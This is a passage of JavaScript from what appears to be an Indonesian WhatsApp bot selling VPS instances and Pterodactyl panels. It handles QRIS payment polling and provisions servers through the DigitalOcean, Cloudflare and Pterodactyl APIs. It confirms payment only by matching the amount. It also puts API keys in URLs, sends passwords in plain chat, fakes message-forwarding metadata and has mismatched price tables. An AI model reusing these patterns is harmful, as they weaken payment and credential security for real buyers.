*3.* Ram 8GB & CPU 4 - Rp45.000
*4.* Ram 16GB & CPU 4 - Rp55.000

Contoh penggunaan: *.buyvps* 1|namadomain
`;
    if (!text) return m.reply(teks);

    let args = text.split("|");
    if (args.length < 2) return m.reply("⚠️ Format salah! Gunakan format: *.buyvps* nomor_vps|nama_domain");

    let paketVPS = args[0].trim();
    let namaDomain = args[1].trim().toLowerCase();

    let Obj = {};
    if (paketVPS == "1") {
        Obj.images = "s-1vcpu-1gb";
        Obj.harga = "15000";
    } else if (paketVPS == "2") {
        Obj.images = "s-1vcpu-2gb";
        Obj.harga = "20000";
    } else if (paketVPS == "3") {
        Obj.images = "s-2vcpu-2gb";
        Obj.harga = "25000";
    } else if (paketVPS == "4") {
        Obj.images = "s-2vcpu-4gb";
        Obj.harga = "45000";
    } else if (paketVPS == "5") {
        Obj.images = "s-4vcpu-8gb";
        Obj.harga = "45000";
    } else if (paketVPS == "6") {
        Obj.images = "s-4vcpu-16gb";
        Obj.harga = "55000";
    } else return m.reply(teks);

    const UrlQr = global.qrisOrderKuota;
    const amount = Number(Obj.harga) + generateRandomNumber(110, 250);
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
*• ID:* ${get.data.result.transactionId}
*• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
*• Barang:* VPS Digital Ocean
*• Expired:* 5 menit

⚠️ QRIS pembayaran hanya berlaku dalam 5 menit. Jika melewati batas waktu, transaksi dianggap tidak valid!
`;
    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teks3 }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
    };

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data;
        
        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            let hostname = namaDomain;
            let password = await generateRandomPassword();

            try {
                let dropletData = {
                    name: hostname,
                    region: "sgp1",
                    size: Obj.images,
                    image: "ubuntu-20-04-x64",
                    ssh_keys: null,
                    backups: false,
                    ipv6: true,
                    user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
                };

                let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + global.apiDigitalOcean,
                    },
                    body: JSON.stringify(dropletData),
                });

                let responseData = await response.json();
                if (response.ok) {
                    let dropletId = responseData.droplet.id;
                    await m.reply("⏳ Memproses pembuatan VPS...");
                    await sleep(60000);

                    let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                        method: "GET",
                        headers: {
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + global.apiDigitalOcean,
                        },
                    });

                    let dropletData = await dropletResponse.json();
                    let ipVPS = dropletData.droplet.networks.v4[0].ip_address || "Tidak ada alamat IP yang tersedia";

                    async function createSubdomain(host, ip) {
                        return axios.post(`https://api.cloudflare.com/client/v4/zones/${global.cloudflareZone}/dns_records`, {
                            type: "A",
                            name: host,
                            content: ip,
                            ttl: 3600,
                            proxied: false,
                        }, {
                            headers: { Authorization: `Bearer ${global.cloudflareApiKey}`, "Content-Type": "application/json" },
                        });
                    }

                    const subdomain1 = `${namaDomain}.${global.domainUtama}`;
                    const subdomain2 = `node.${namaDomain}.${global.domainUtama}`;

                    let result1 = await createSubdomain(subdomain1, ipVPS);
                    let result2 = await createSubdomain(subdomain2, ipVPS);

                    let messageText = `
✅ *VPS Berhasil Dibuat!*
🆔 *ID:* ${dropletId}
🌐 *Subdomain Utama:* ${subdomain1}
🌐 *Subdomain Node:* ${subdomain2}
📌 *IP VPS:* ${ipVPS}
🔑 *Password:* ${password}
`;
                    await dwiaff.sendMessage(m.sender, { text: messageText });
                } else {
                    throw new Error(`Gagal membuat VPS: ${responseData.message}`);
                }
            } catch (err) {
                console.error(err);
                m.reply(`⚠️ Terjadi kesalahan saat membuat VPS: ${err.message}`);
            }

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'buyvps': {
if (!q) return m.reply(example("nama domain"))

  let teksHeader = `
𝙋𝙞𝙡𝙞𝙝 𝙎𝙚𝙨𝙪𝙖𝙞 𝙆𝙚𝙗𝙪𝙩𝙪𝙝𝙖𝙣 𝘼𝙣𝙙𝙖 𝘿𝙞 𝘽𝙖𝙬𝙖𝙝 𝙞𝙣𝙞

𝙅𝙞𝙠𝙖 𝙏𝙚𝙧𝙟𝙖𝙙𝙞 𝙈𝙖𝙨𝙖𝙡𝙖𝙝 𝙎𝙖𝙖𝙩 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙋𝙚𝙢𝙗𝙚𝙡𝙞𝙖𝙣 𝙑𝙥𝙨 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙝𝙪𝙗𝙪𝙣𝙜𝙞 𝙊𝙬𝙣𝙚𝙧 𝙎𝙘𝙧𝙞𝙥𝙩

𝙉𝙖𝙢𝙖 𝘿𝙤𝙢𝙖𝙞𝙣 : ${text}

𝙅𝙞𝙠𝙖 𝙉𝙖𝙢𝙖 𝘿𝙤𝙢𝙖𝙞𝙣 𝙆𝙤𝙨𝙤𝙣𝙜 𝙆𝙚𝙩𝙞𝙠 .buyvps <nama domain> 𝙐𝙡𝙖𝙣𝙜

━━━━━━━━━━━━━━━━━━━━━━━  
 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙝𝙖𝙥𝙥𝙮 𝙬𝙚 𝙖𝙧𝙚 𝙝𝙖𝙥𝙥𝙮
━━━━━━━━━━━━━━━━━━━━━━━
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ ʀᴀᴍ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 1 𝘾𝙤𝙧𝙚 1", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 1|${text}` },
{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 2 𝘾𝙤𝙧𝙚 1", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 2|${text}` },
{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 2 𝘾𝙤𝙧𝙚 2", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 3|${text}` }, 
{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 4 𝘾𝙤𝙧𝙚 2", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 4|${text}` },
{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 8 𝘾𝙤𝙧𝙚 4", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 5|${text}` },
{ title: "𝘽𝙚𝙡𝙞 𝙑𝙥𝙨 𝙍𝙖𝙢 16 𝘾𝙤𝙧𝙚 4", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙑𝙥𝙨 𝘿𝙤", id: `.buyvpsdo 6|${text}` }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case 'buypanel': {
  let teksHeader = `
𝙋𝙞𝙡𝙞𝙝 𝙎𝙚𝙨𝙪𝙖𝙞 𝙆𝙚𝙗𝙪𝙩𝙪𝙝𝙖𝙣 𝘼𝙣𝙙𝙖 𝘿𝙞 𝘽𝙖𝙬𝙖𝙝 𝙞𝙣𝙞

𝙅𝙞𝙠𝙖 𝙏𝙚𝙧𝙟𝙖𝙙𝙞 𝙈𝙖𝙨𝙖𝙡𝙖𝙝 𝙎𝙖𝙖𝙩 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙋𝙚𝙢𝙗𝙚𝙡𝙞𝙖𝙣 𝙑𝙥𝙨 𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙝𝙪𝙗𝙪𝙣𝙜𝙞 𝙊𝙬𝙣𝙚𝙧 𝙎𝙘𝙧𝙞𝙥𝙩

━━━━━━━━━━━━━━━━━━━━━━━  
 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙝𝙖𝙥𝙥𝙮 𝙬𝙚 𝙖𝙧𝙚 𝙝𝙖𝙥𝙥𝙮
━━━━━━━━━━━━━━━━━━━━━━━
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ sᴇʀᴠᴇʀ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ sᴇʀᴠᴇʀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "𝘽𝙪𝙮 𝙋𝙖𝙣𝙚𝙡 𝙋𝙪𝙗𝙡𝙞𝙘", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙋𝙖𝙣𝙚𝙡 𝙋𝙪𝙗𝙡𝙞𝙘", id: `.buypanelpublic` },
{ title: "𝘽𝙚𝙡𝙞 𝙋𝙖𝙣𝙚𝙡 𝙋𝙧𝙞𝙫𝙖𝙩𝙚", description: "𝙈𝙚𝙢𝙗𝙚𝙡𝙞 𝙋𝙖𝙣𝙚𝙡 𝙋𝙧𝙞𝙫𝙖𝙩𝙚", id: ".buypanelprivate" }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case "buypanelpublic": {

const buypanel = `
*===> Silahkan Pilih Ram Dibawah Ini <====*
`

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/thumbnail.jpg") }, { upload: dwiaff.waUploadToServer })

const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `
*===> Silahkan Pilih Ram Dibawah Ini <====*
`
}), 

contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁 [ 𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ]`, newsletterJid: global.idsaluran }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: ``, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  "title": "Silahkan Pilih Ram Dibawah Ini",
  "sections": [
    {
      "title": "Klik Salah Satu Produk untuk Mememesan !",
      "rows": [
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟭 𝗚𝗕",
          "title": "Buy Panel 1 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 1gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟮 𝗚𝗕",
          "title": "Buy Panel 2 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 2gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟯 𝗚𝗕",
          "title": "Buy Panel 3 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 3gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟰 𝗚𝗕",
          "title": "Buy Panel 4 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 4gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟱 𝗚𝗕",
          "title": "Buy Panel 5 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 5gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟲 𝗚𝗕",
          "title": "Buy Panel 6 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 6gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟳 𝗚𝗕",
          "title": "Buy Panel 7 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 7gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟴 𝗚𝗕",
          "title": "Buy Panel 8 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 8gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟵 𝗚𝗕",
          "title": "Buy Panel 9 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 9gb"
        },
        {
         "header": "𝗣𝗮𝗸𝗲𝘁 𝟭𝟬 𝗚𝗕",
          "title": "Buy Panel 10 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp 10gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱",
          "title": "Buy Panel unlimited",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp unlimited"
        }
]}
]}
]}`
},
{
    name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Script\",\"id\":\".buysc\"}`
},
{
name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Admin Panel\",\"id\":\".buyadp\"}`
},
{          
name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Vps \",\"id\":\".buyvps\"}`
}, 
{          
    name: "quick_reply",
    buttonParamsJson: `{\"display_text\":\"Info Layanan\",\"id\":\".layanan\"}`
}
]
})
}]
})
})}
}}, {quoted: m})
await dwiaff.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

case "buypanelprivate": {

const buypanel = `
*===> Silahkan Pilih Ram Dibawah Ini <====*
`

let imgscs = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/thumbnail.jpg") }, { upload: dwiaff.waUploadToServer })

const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `
*===> Silahkan Pilih Ram Dibawah Ini <====*
`
}), 

contextInfo: {
isForwarded: false, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁 [ 𝗠𝗮𝗿𝗸𝗲𝘁𝗽𝗹𝗮𝗰𝗲 ]`, newsletterJid: global.idsaluran }, 
mentionedJid: [global.owner+"@s.whatsapp.net", m.sender]
}, 

carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: ``, 
hasMediaAttachment: true,
...imgscs
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "single_select",
buttonParamsJson:
`{
  "title": "Silahkan Pilih Ram Dibawah Ini",
  "sections": [
    {
      "title": "Klik Salah Satu Produk untuk Mememesan !",
      "rows": [
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟭 𝗚𝗕",
          "title": "Buy Panel 1 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 1gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟮 𝗚𝗕",
          "title": "Buy Panel 2 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 2gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟯 𝗚𝗕",
          "title": "Buy Panel 3 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 3gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟰 𝗚𝗕",
          "title": "Buy Panel 4 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 4gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟱 𝗚𝗕",
          "title": "Buy Panel 5 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 5gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟲 𝗚𝗕",
          "title": "Buy Panel 6 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 6gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟳 𝗚𝗕",
          "title": "Buy Panel 7 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 7gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟴 𝗚𝗕",
          "title": "Buy Panel 8 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 8gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝟵 𝗚𝗕",
          "title": "Buy Panel 9 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 9gb"
        },
        {
         "header": "𝗣𝗮𝗸𝗲𝘁 𝟭𝟬 𝗚𝗕",
          "title": "Buy Panel 10 GB",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 10gb"
        },
        {
          "header": "𝗣𝗮𝗸𝗲𝘁 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱",
          "title": "Buy Panel unlimited",
          "description": "© 𝗡𝗮𝗯𝘇𝘅𝗛𝗼𝘀𝘁",
          "id": ".buyp1 unlimited"
        }
]}
]}
]}`
},
{
    name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Script\",\"id\":\".buysc\"}`
},
{
name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Admin Panel\",\"id\":\".buyadp\"}`
},
{          
name: "quick_reply",

    buttonParamsJson: `{\"display_text\":\"Buy Vps \",\"id\":\".buyvps\"}`
}, 
{          
    name: "quick_reply",
    buttonParamsJson: `{\"display_text\":\"Info Layanan\",\"id\":\".layanan\"}`
}
]
})
}]
})
})}
}}, {quoted: m})
await dwiaff.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break

case "buyp1": {
if (m.isGroup) return m.reply(mess.private);
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "11000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await dwiaff.sendMessage(m.chat, {
  footer: `© 2024 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, {text:`
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}
* *Cpu :* ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}
* *Disk :* ${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await dwiaff.sendMessage(orang, {text: tekspanel}, {quoted: null})
await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break
       
case "buyp": {
if (m.isGroup) return m.reply(mess.private);
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let teks = `
 *乂 List ram server yang tersedia*
 
* 1GB
* 2GB
* 3GB
* 4GB
* 5GB
* 6GB
* 7GB
* 8GB
* 10GB
* unlimited

 Contoh penggunaan : *.buypanel* 2gb
`
if (!text) return m.reply(teks)
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
